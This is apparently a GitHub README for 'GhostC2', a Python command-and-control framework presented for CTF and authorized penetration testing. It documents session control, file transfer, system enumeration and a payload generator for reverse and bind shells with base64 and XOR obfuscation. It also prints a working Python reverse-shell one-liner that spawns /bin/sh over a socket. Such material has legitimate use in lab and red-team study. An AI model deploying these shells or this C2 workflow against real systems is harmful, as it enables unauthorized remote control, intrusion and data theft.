#  GhostC2

A modular Python-based Command & Control framework for CTF and authorized penetration testing. Supports multi-session management, payload generation with obfuscation, file transfers, and a full interactive C2 console.

> ⚠️ **For authorized testing and CTF use only. Never use against systems you don't own or have explicit permission to test.**

---

##  Installation

```bash
git clone https://github.com/Dreadonyx/GhostC2.git
cd GhostC2
pip install -r requirements.txt
```

---

##  Usage

### Full C2 Mode
```bash
# Start C2 on default port 4444
python main.py

# Start C2 on custom port
python main.py -l 9001
```

### Simple Netcat-style Listener
```bash
python main.py -s 4444
```

### Payload Generator Only
```bash
python main.py -g
python main.py -g --lhost 10.10.14.5 --lport 4444
```

---

##  C2 Console Commands

```
sessions              List all active sessions
use <id>              Interact with a session
kill <id>             Terminate a session
cleanup               Remove dead sessions
generate              Launch payload generator
listen <port>         Start new listener on port
listeners             Show active listeners
help                  Show help
exit                  Quit GhostC2
```

### Inside a Session

```
<command>                    Execute on remote target
upload <local> [remote]      Upload file to target
download <remote> [local]    Download file from target
sysinfo                      Full system enumeration
background / bg              Return to C2 console
exit                         Kill this session
```

---

##  Payload Generator

Supports 6 payload types with 3 obfuscation options:

| # | Type | Language |
|---|------|----------|
| 1 | Python Reverse Shell | Python3 |
| 2 | Bash Reverse Shell | Bash |
| 3 | PHP Reverse Shell | PHP |
| 4 | PowerShell Reverse Shell | PowerShell |
| 5 | Python Bind Shell | Python3 |
| 6 | Netcat Oneliners | Bash/nc |

**Obfuscation options:**
- None (raw payload)
- Base64 encoded one-liner
- XOR encoded with Python decoder stub

---

##  Session Table

```
ID  IP              PORT   OS       USER    HOST         TIME     ALIVE
1   192.168.1.10    52341  Linux    root    victim       00:03:21  ✓
2   10.10.14.23     49201  Windows  admin   desktop-win  00:01:05  ✓
```

---

##  Project Structure

```
GhostC2/
├── main.py                    # Entry point — CLI
├── core/
│   ├── listener.py            # TCP listener
│   ├── session.py             # Session object (execute, upload, download)
│   ├── session_manager.py     # Manages all sessions
│   └── console.py             # Interactive C2 console
├── payloads/
│   ├── generator.py           # Payload builder
│   ├── encoder.py             # Base64/XOR obfuscation
│   └── templates/
│       ├── python_reverse.py
│       ├── bash_reverse.sh
│       ├── php_reverse.php
│       ├── powershell_reverse.ps1
│       ├── python_bind.py
│       └── nc_oneliner.txt
├── modules/
│   └── sysinfo.py             # Full system enumeration
└── utils/
    ├── logger.py              # Colored output
    └── helpers.py             # IP/port validation, local IP
```

---

##  Test It (Safe Local Lab)

```bash
# Terminal 1 — start GhostC2
python main.py -l 4444

# Terminal 2 — simulate reverse shell (use on your own machine only)
python3 -c "
import socket,subprocess,os
s=socket.socket()
s.connect(('127.0.0.1',4444))
os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2)
subprocess.call(['/bin/sh','-i'])
"

# Back in Terminal 1
GhostC2 > sessions
GhostC2 > use 1
ghost@session-1:~$ whoami
ghost@session-1:~$ sysinfo
ghost@session-1:~$ bg
```

---

##  Dependencies

Only `colorama` — everything else is Python stdlib.

---

##  Author

**Dreadonyx** — [github.com/Dreadonyx](https://github.com/Dreadonyx)
